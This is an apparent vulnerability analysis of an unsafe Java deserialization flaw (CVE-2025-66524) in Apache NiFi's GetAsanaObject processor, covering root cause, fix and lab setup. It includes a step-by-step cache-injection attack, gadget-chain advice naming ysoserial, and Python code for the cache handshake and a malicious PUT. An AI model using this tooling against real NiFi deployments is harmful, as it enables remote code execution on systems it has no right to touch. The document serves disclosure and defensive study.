# Vulnerability Analysis: CVE-2025-66524

## Executive Summary

CVE-2025-66524 is an unsafe Java deserialization vulnerability in the Apache NiFi `GetAsanaObject` processor (versions 1.20.0–2.6.0). The `GenericObjectSerDe` class uses `ObjectInputStream.readObject()` without any class filtering to deserialize data retrieved from a NiFi Distributed Map Cache server. An attacker with network access to the cache server (default TCP port 4557, no authentication required) can inject a crafted serialized Java object into the cache, which will be deserialized by the processor, leading to Remote Code Execution (RCE).

---

## Root Cause

**CWE-502: Deserialization of Untrusted Data**

The `GenericObjectSerDe<V>` class implements both `Serializer<V>` and `Deserializer<V>` interfaces using Java's native `ObjectInputStream`/`ObjectOutputStream` serialization mechanism. The `deserialize()` method creates an `ObjectInputStream` from the raw byte array received from the Distributed Map Cache server and calls `readObject()` without:

1. Any `ObjectInputFilter` or class-name whitelist
2. Any type validation before the unchecked `(V)` cast
3. Any integrity verification of the serialized data

The data source (Distributed Map Cache server) is network-accessible and has **no authentication** by default, meaning any attacker on the same network can inject arbitrary serialized Java objects.

### Vulnerable Code

**File**: `nifi-extension-bundles/nifi-asana-bundle/nifi-asana-processors/src/main/java/org/apache/nifi/processors/asana/GenericObjectSerDe.java`

```java
// Lines 29-45
public class GenericObjectSerDe <V> implements Serializer<V>, Deserializer<V> {

    @Override
    @SuppressWarnings("unchecked")
    public V deserialize(byte[] value) throws DeserializationException, IOException {
        if (value == null || value.length == 0) {
            return null;
        }

        try (ByteArrayInputStream bis = new ByteArrayInputStream(value)) {
            try (ObjectInputStream objectInputStream = new ObjectInputStream(bis)) {
                return (V) objectInputStream.readObject();  // <-- VULNERABLE: unrestricted deserialization
            } catch (ClassNotFoundException e) {
                throw new DeserializationException(e);
            }
        }
    }
    // ...
}
```

---

## Vulnerable File(s) and Function(s)

| File | Function | Lines | Role |
|------|----------|-------|------|
| `GenericObjectSerDe.java` | `deserialize(byte[])` | 33–44 | **Primary vulnerability**: Unsafe `ObjectInputStream.readObject()` without filtering |
| `GetAsanaObject.java` | `recoverState(ProcessContext)` | 363–372 | **Trigger point**: Calls `client.get()` with `STATE_MAP_VALUE_SERIALIZER` (a `GenericObjectSerDe<Map<String, String>>`) — the returned bytes are deserialized |
| `GetAsanaObject.java` | `onTrigger(ProcessContext, ProcessSession)` | 242–243 | **Entry point**: Calls `recoverState()` at the start of every processor trigger cycle |

### Static Field Declarations (GetAsanaObject.java, lines 211–212)
```java
protected static final GenericObjectSerDe<String> STATE_MAP_KEY_SERIALIZER = new GenericObjectSerDe<>();
protected static final GenericObjectSerDe<Map<String, String>> STATE_MAP_VALUE_SERIALIZER = new GenericObjectSerDe<>();
```

---

## Triggering Input

### What Input Triggers the Vulnerability

A crafted Java serialized object (byte stream starting with magic `AC ED 00 05`) injected into the NiFi Distributed Map Cache server as the **value** for a key corresponding to the `GetAsanaObject` processor's identifier (a UUID string, itself Java-serialized via `ObjectOutputStream`).

### Exact Trigger Sequence

1. The `GetAsanaObject` processor calls `recoverState()` at the start of every `onTrigger()` invocation
2. `recoverState()` calls `client.get(getIdentifier(), STATE_MAP_KEY_SERIALIZER, STATE_MAP_VALUE_SERIALIZER)`
3. The `MapCacheClientService` serializes the processor UUID key using `GenericObjectSerDe.serialize()` → `ObjectOutputStream.writeObject(String)`
4. Sends a GET request to the cache server with the serialized key bytes
5. The cache server returns the raw value bytes stored for that key
6. `MapCacheClientService` calls `STATE_MAP_VALUE_SERIALIZER.deserialize(rawBytes)` → `GenericObjectSerDe.deserialize(rawBytes)`
7. `GenericObjectSerDe.deserialize()` creates `ObjectInputStream` and calls `readObject()` on the attacker-controlled bytes
8. **Arbitrary code execution occurs** during deserialization if a valid gadget chain is present on the classpath

### Key Format
The cache key is the processor's UUID identifier (assigned by NiFi when the processor is added to the data flow), serialized using `ObjectOutputStream`. The key bytes start with `AC ED 00 05` (Java serialization magic) followed by the serialized String representation.

### Value Format (Malicious Payload)
The value must be a valid Java serialized object stream. The processor expects a `Map<String, String>` but the unchecked cast `(V) objectInputStream.readObject()` means **any** Serializable object will be deserialized before the cast occurs — the gadget chain executes during `readObject()`, before any type check.

---

## Attack Scenario

### Prerequisites
1. Target NiFi instance (1.20.0–2.6.0) has a `GetAsanaObject` processor configured
2. The processor uses a `DistributedMapCacheClient` service pointing to a `DistributedMapCacheServer`
3. Attacker has network access to the Distributed Map Cache server's TCP port (default: **4557**)

### Step-by-Step Attack

**Step 1: Connect to the cache server**
The NiFi Distributed Map Cache server listens on TCP port 4557 by default with **no authentication**. SSL/TLS is optional and off by default.

**Step 2: Complete the NiFi protocol handshake**
```
Client → Server: "NiFi" (4 bytes: 0x4E 0x69 0x46 0x69)
Client → Server: Protocol version 3 (4 bytes: 0x00 0x00 0x00 0x03)
Server → Client: Status 0x14 (RESOURCE_OK, 1 byte)
```

**Step 3: Enumerate existing keys (optional)**
Send a KEYSET operation to discover existing processor identifier keys:
```
Client → Server: writeUTF("keySet")  → 0x00 0x06 "keySet"
Server → Client: Set of key byte arrays (length-prefixed)
```

**Step 4: Inject malicious serialized object**
Send a PUT operation with the target processor's serialized UUID key and a malicious serialized Java object as the value:
```
Client → Server: writeUTF("put")           → 0x00 0x03 "put"
                 writeInt(key.length)       → 4-byte big-endian int
                 write(key_bytes)           → Java-serialized String (processor UUID)
                 writeInt(payload.length)   → 4-byte big-endian int
                 write(payload_bytes)       → Malicious serialized Java object
Server → Client: boolean success (1 byte)
```

**Step 5: Wait for processor trigger**
The `GetAsanaObject` processor runs on its configured schedule. On the next trigger, `onTrigger()` calls `recoverState()` which GETs the value from cache and deserializes it via `GenericObjectSerDe.deserialize()`, executing the gadget chain.

### Alternative Attack: Rogue Cache Server
An attacker who can modify NiFi's flow configuration (requires NiFi UI/API authentication with PR:L) could point the `DistributedMapCacheClient` to a rogue cache server that returns malicious serialized objects for all GET requests.

---

## Impact

- **Confidentiality**: HIGH — Arbitrary code execution allows reading any data accessible to the NiFi process
- **Integrity**: HIGH — Arbitrary code execution allows modifying data, configurations, and flow files
- **Availability**: HIGH — Arbitrary code execution can crash or DoS the NiFi instance
- **Impact Type**: Remote Code Execution (RCE) as the NiFi process user
- **CVSS**: 8.8 (HIGH) — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

---

## Authentication Requirements

### NiFi Web UI/API Authentication
- NiFi 2.x defaults to HTTPS with auto-generated single-user credentials
- Username: Generated at startup (logged to `nifi-app.log`)
- Password: Generated at startup (logged to `nifi-app.log`)
- **Not required for the primary attack vector** (cache injection)

### Distributed Map Cache Server Authentication
- **No authentication mechanism exists**
- SSL/TLS is optional and off by default
- Any client that can reach the TCP port can read/write cache entries
- The attacker only needs **network access** to port 4557

### Primary Attack Vector Authentication
- **Pre-auth from the cache server's perspective** — the cache server has no authentication
- **Low privilege from NiFi perspective** — the attacker needs someone with NiFi access (PR:L) to have configured the GetAsanaObject processor with a DistributedMapCacheClient; the attacker themselves just need network access to the cache port

---

## Fix Assessment

### What the Fix Does
The fix (commit `1c081c15544b8459d69daaae2056f0f433cafce6`) completely **replaces** the vulnerable `GenericObjectSerDe` class:

1. **Deleted** `GenericObjectSerDe.java` — Removed the class entirely
2. **Added** `StringSerDe.java` — Serializes String keys using `String.getBytes(UTF_8)` / `new String(bytes, UTF_8)` (no Java object serialization)
3. **Added** `MapStringSerDe.java` — Serializes `Map<String, String>` values using Google Gson JSON serialization (no Java object serialization)
4. **Modified** `GetAsanaObject.java` — Changed serializer types from `GenericObjectSerDe<>` to `StringSerDe` and `MapStringSerDe`

### Fix Quality Assessment

The fix is **thorough and complete** for this specific vulnerability:

1. **Root cause addressed**: Java `ObjectInputStream` deserialization is completely eliminated. The new `StringSerDe` uses simple UTF-8 byte conversion, and `MapStringSerDe` uses Gson JSON parsing — neither involves Java native deserialization.

2. **No bypass possible on the fixed code**: The new deserializers parse UTF-8 strings and JSON respectively. Injecting a Java serialized object would cause a JSON parse error or produce a garbage string — it cannot trigger `ObjectInputStream.readObject()` because `ObjectInputStream` is no longer used anywhere.

3. **Both key and value serializers fixed**: Both `STATE_MAP_KEY_SERIALIZER` (String) and `STATE_MAP_VALUE_SERIALIZER` (Map) were replaced.

4. **Type-safe implementations**: The new serializers are concrete types (`StringSerDe`, `MapStringSerDe`) rather than generic (`GenericObjectSerDe<V>`), preventing future misuse for arbitrary object serialization.

5. **Backward compatibility consideration**: Existing cached state written by the old `GenericObjectSerDe` will fail to deserialize with the new serializers after upgrade (Gson won't parse Java serialized bytes). This is acceptable — the processor handles deserialization failures gracefully in `onTrigger()` (lines 244-249: catches Exception, logs "Failed to recover state", calls `objectFetcher.clearState()`).

---

## Escalation Path

**Deserialization → Remote Code Execution**

The deserialization primitive directly achieves RCE if a suitable gadget chain exists on the classloader. The `nifi-asana-processors` NAR includes `commons-collections4` version 4.5.0 as a direct dependency. Analysis of available gadget chains:

1. **URLDNS (JDK-only)** — **Guaranteed to work**. Uses `java.util.HashMap` + `java.net.URL` to trigger a DNS lookup during deserialization. Proves arbitrary deserialization occurred. No restrictions.

2. **CommonsCollections2/4 (ysoserial)** — Uses `PriorityQueue` + `TransformingComparator` + `InvokerTransformer` from `commons-collections4`. In CC4 4.1+, `InvokerTransformer` added a security check in `readObject()` that requires system property `org.apache.commons.collections.enableUnsafeSerialization=true`. **May not work** unless this property is set.

3. **CommonsCollections chains using other transformers** — CC4 4.5.0 may have other serializable transformer implementations. The PoC agent should enumerate available gadget paths at runtime.

4. **JDK-internal chains** — With JDK 21, most internal gadget chains (JDK7u21, etc.) are patched. URLDNS remains viable.

**Recommended PoC approach**: Use URLDNS to demonstrate deserialization, then attempt CC4 chain for RCE. If CC4 chain fails due to the security check, document the finding and note that RCE is achievable with alternative gadgets or when the system property is enabled.

**Alternative escalation via ysoserial payloads**: The PoC should generate payloads using ysoserial or a custom serializer. The URLDNS payload is trivial to generate in Python using `struct` and manual Java serialization byte construction.

---

## Related Attack Surface

### Same Pattern in the Codebase
**None identified** — `GenericObjectSerDe` is exclusively used within the `nifi-asana-bundle`:
- Only 3 files reference it: `GenericObjectSerDe.java` (definition), `GetAsanaObject.java` (usage), `GenericObjectSerDeTest.java` (tests)
- No other NiFi processors or bundles use `GenericObjectSerDe`
- No other files in the codebase use `ObjectInputStream` for cache deserialization

### Broader Distributed Map Cache Attack Surface
The Distributed Map Cache server itself stores raw bytes without authentication. Any processor using a `DistributedMapCacheClient` with an unsafe `Deserializer` implementation would be vulnerable to the same attack. However, no other processors in the NiFi 2.6.0 codebase were found to use `ObjectInputStream`-based deserializers for cache operations.

### Cache Server Exposure
The `DistributedMapCacheServer` (default port 4557) has:
- No authentication mechanism
- Optional SSL/TLS (disabled by default)
- Full read/write access to any connected client
- Support for operations: PUT, GET, KEYSET, REMOVE, SUBMAP, etc.

This means any network-adjacent attacker can read/write/delete cache entries, enabling both this deserialization attack and potential data integrity attacks on other processors using the cache.

---

## NiFi Distributed Map Cache Wire Protocol

### Handshake
```
Client → Server: 0x4E 0x69 0x46 0x69  (magic "NiFi")
Client → Server: 0x00 0x00 0x00 0x03  (version 3, big-endian int32)
Server → Client: 0x14                  (RESOURCE_OK)
```

### PUT Operation
```
Client → Server:
  writeUTF("put")               → 0x00 0x03 0x70 0x75 0x74
  writeInt(key_length)           → 4-byte big-endian int32
  write(key_bytes)               → raw bytes
  writeInt(value_length)         → 4-byte big-endian int32
  write(value_bytes)             → raw bytes (malicious serialized object)

Server → Client:
  boolean (1 byte)               → 0x01 (success) or 0x00 (failure)
```

### GET Operation
```
Client → Server:
  writeUTF("get")               → 0x00 0x03 0x67 0x65 0x74
  writeInt(key_length)           → 4-byte big-endian int32
  write(key_bytes)               → raw bytes

Server → Client:
  writeInt(value_length)         → 4-byte big-endian int32
  write(value_bytes)             → raw bytes
```

### KEYSET Operation
```
Client → Server:
  writeUTF("keySet")            → 0x00 0x06 0x6B 0x65 0x79 0x53 0x65 0x74

Server → Client:
  (set of length-prefixed byte arrays)
```

### CLOSE Operation
```
Client → Server:
  writeUTF("close")             → 0x00 0x05 0x63 0x6C 0x6F 0x73 0x65
```

### Key Encoding Notes
- Strings use Java's `DataOutputStream.writeUTF()` format: 2-byte unsigned short length prefix (big-endian) + UTF-8 bytes
- Binary data uses 4-byte signed int length prefix (big-endian) + raw bytes
- All integers are big-endian (network byte order)
- Protocol versions: V1 (basic), V2 (atomic ops), V3 (subMap/keySet/removeAndGet)

---

## Build System

### Build Tool
Apache Maven (multi-module project)

### Java Version
JDK 21 (`maven.compiler.release=21`)

### Build Commands

**Full NiFi build** (not recommended for PoC — takes 30+ minutes):
```bash
./mvnw clean install -DskipTests -T 2C
```

**Vulnerable module only**:
```bash
cd nifi-extension-bundles/nifi-asana-bundle
mvn clean package -DskipTests -pl nifi-asana-processors
```

### Dependencies (for nifi-asana-processors)
| Artifact | Version | Scope | Relevance |
|----------|---------|-------|-----------|
| `org.apache.nifi:nifi-distributed-cache-client-service-api` | 2.6.0 | compile | Provides cache client interfaces |
| `org.apache.nifi:nifi-asana-services-api` | 2.6.0 | provided | Asana client service API |
| `org.apache.commons:commons-collections4` | 4.5.0 | compile | **Gadget chain source** |
| `com.google.code.gson:gson` | (managed) | provided | JSON serialization |
| `org.apache.httpcomponents:httpcore` | (managed) | provided | HTTP support |
| `com.asana:asana` | (managed) | provided | Asana SDK |
| `com.google.http-client:google-http-client` | 1.36.0 | provided | Google HTTP client |

### Runtime Requirements

**For the PoC lab environment:**

1. **Apache NiFi 2.6.0** — Pre-built binary distribution
   - Download: `https://archive.apache.org/dist/nifi/2.6.0/nifi-2.6.0-bin.zip`
   - Requires JDK 21 runtime

2. **DistributedMapCacheServer** — NiFi controller service (built-in)
   - Must be configured and enabled in NiFi
   - Default port: 4557 (TCP)
   - Needs to be exposed to the attacker (network access)

3. **GetAsanaObject processor** — Must be added to the NiFi flow
   - Requires an Asana Client Service (can be configured with dummy credentials)
   - Requires a DistributedMapCacheClient pointing to the cache server

4. **Network setup:**
   - NiFi HTTPS port: 8443 (for UI/API access)
   - Cache server TCP port: 4557 (for cache injection — **this is the attack surface**)

### Recommended Lab Setup

**Option 1: Pre-built NiFi binary (recommended for PoC)**
```
Docker base image: bellsoft/liberica-openjdk-debian:21
NiFi version: 2.6.0 binary distribution
Services needed:
  - NiFi instance with GetAsanaObject processor
  - DistributedMapCacheServer on port 4557
  - DistributedMapCacheClient configured to connect to server
```

**Option 2: Build from source**
Not recommended. The full NiFi build is very large (1000+ Maven modules). For the PoC, use the pre-built binary and focus on the wire-level cache injection.

### Docker Compose Architecture
```
nifi:
  image: apache/nifi:2.6.0  (or custom build)
  ports:
    - "8443:8443"    # NiFi HTTPS UI
    - "4557:4557"    # Distributed Map Cache Server

attacker:
  image: python:3.11-slim
  # Runs the PoC script that injects payload into cache
```

---

## PoC Development Guidance

### Recommended PoC Strategy

1. **Phase 1: URLDNS proof of deserialization**
   - Generate a URLDNS gadget payload (HashMap + URL pointing to attacker-controlled DNS)
   - Serialize it as a Java object stream (can be done in Python by constructing raw bytes or using ysoserial-generated payloads)
   - Inject into cache via the NiFi cache protocol
   - Trigger the processor and observe DNS callback

2. **Phase 2: RCE via CommonsCollections4**
   - Generate a CC4 gadget payload using ysoserial or manually
   - Test with `commons-collections4:4.5.0` on the classpath
   - If CC4 security check blocks it, document and use URLDNS as primary demonstration

### Key Serialization for Cache Injection

The cache key for the processor state is the processor UUID serialized via `ObjectOutputStream`. To generate the correct key bytes in Python:

```python
import struct, io

def java_serialize_string(s):
    """Serialize a Java String using ObjectOutputStream format"""
    encoded = s.encode('utf-8')
    # Java serialization stream header
    buf = b'\xac\xed'  # STREAM_MAGIC
    buf += b'\x00\x05'  # STREAM_VERSION
    buf += b'\x74'      # TC_STRING
    buf += struct.pack('>H', len(encoded))  # 2-byte length
    buf += encoded
    return buf
```

### Cache Protocol Implementation in Python

```python
import socket, struct

def nifi_handshake(sock):
    sock.sendall(b'NiFi')                          # Magic
    sock.sendall(struct.pack('>I', 3))              # Version 3
    status = sock.recv(1)                           # Wait for RESOURCE_OK (0x14)
    assert status == b'\x14', f"Handshake failed: {status.hex()}"

def nifi_put(sock, key_bytes, value_bytes):
    buf = struct.pack('>H', 3) + b'put'             # writeUTF("put")
    buf += struct.pack('>I', len(key_bytes)) + key_bytes
    buf += struct.pack('>I', len(value_bytes)) + value_bytes
    sock.sendall(buf)
    resp = sock.recv(1)                             # Boolean response
    return resp == b'\x01'
```
